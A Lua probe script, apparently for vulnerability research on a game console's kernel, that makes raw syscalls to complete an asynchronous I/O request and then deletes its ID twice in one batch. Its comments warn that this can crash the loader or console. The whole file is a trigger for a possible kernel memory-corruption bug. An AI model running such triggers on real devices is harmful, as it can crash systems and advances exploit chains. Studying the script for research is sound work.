-- CRASH_CLASS: HIGH
-- One bounded duplicate-ID batch against a completed AIO request.
-- Offline prepared only: this can terminate the loader or crash the console.

print("=== PROBE 96a: AIO DUPLICATE DELETE ===")

local function num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or -1
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(p, v) memory.write_dword(p, v) end
local function rd(p) return num(memory.read_dword(p)) end
local function wq(p, v) memory.write_qword(p, uint64(v)) end
local function call(label, n, ...)
    print("[BEFORE] " .. label)
    local args = {...}
    local ok, rv = pcall(function() return sc(n)(unpack(args)) end)
    print("[AFTER] " .. label .. " ok=" .. tostring(ok) .. " rv=" .. tostring(rv))
    return ok, num(rv)
end

print("pid=" .. num(sc(20)()))
call("aio_init", 670, uint64(0), uint64(0), uint64(0), uint64(0))

-- Invalid fd follows the completed-request path observed in 95c, without I/O.
local req = memory.alloc(0x30)
local buf = memory.alloc(8)
local idbuf = memory.alloc(8)
for off = 0, 0x2C, 4 do wd(req + off, 0) end
wd(buf, 0xDEADBEEF)
wq(req + 0x00, 0)
wq(req + 0x08, 1)
wq(req + 0x10, buf)
wq(req + 0x18, 0)
wd(req + 0x20, 0x7FFFFFFF)
wd(idbuf, 0xDEADDEAD)
local ok_submit, rv_submit = call("submit_invalid_fd", 669,
    uint64(1), uint64(req), uint64(1), uint64(1), uint64(idbuf))
local id = rd(idbuf)
print(string.format("id=0x%08X", id))
if not ok_submit or rv_submit ~= 0 or id == 0xDEADDEAD then
    print("STOP: no published request")
    return
end

local state = memory.alloc(8)
local delay = memory.alloc(16)
wq(delay, 0); wq(delay + 8, 10000000)
local complete = false
for attempt = 1, 20 do
    wd(state, 0xDEADDEAD)
    local ok, rv = call("poll_" .. attempt, 664,
        uint64(idbuf), uint64(1), uint64(state))
    local value = rd(state)
    print(string.format("poll_state=0x%08X", value))
    if not ok or rv ~= 0 then break end
    if value % 0x10000 == 3 then complete = true; break end
    sc(240)(uint64(delay), uint64(0))
end
if not complete then
    print("STOP: request did not reach completed state")
    return
end

local ids = memory.alloc(8)
local results = memory.alloc(8)
wd(ids, id); wd(ids + 4, id)
wd(results, 0xDEADDEAD); wd(results + 4, 0xDEADDEAD)
print(string.format("[BEFORE] duplicate_delete id=0x%08X count=2", id))
local ok_delete, rv_delete = pcall(function()
    return sc(662)(uint64(ids), uint64(2), uint64(results))
end)
print("[AFTER] duplicate_delete ok=" .. tostring(ok_delete) ..
      " rv=" .. tostring(rv_delete) ..
      string.format(" results=0x%08X,0x%08X", rd(results), rd(results + 4)))

wd(state, 0xDEADDEAD)
call("post_delete_poll", 664, uint64(idbuf), uint64(1), uint64(state))
print(string.format("post_delete_state=0x%08X", rd(state)))
print("=== PROBE 96a COMPLETE ===")
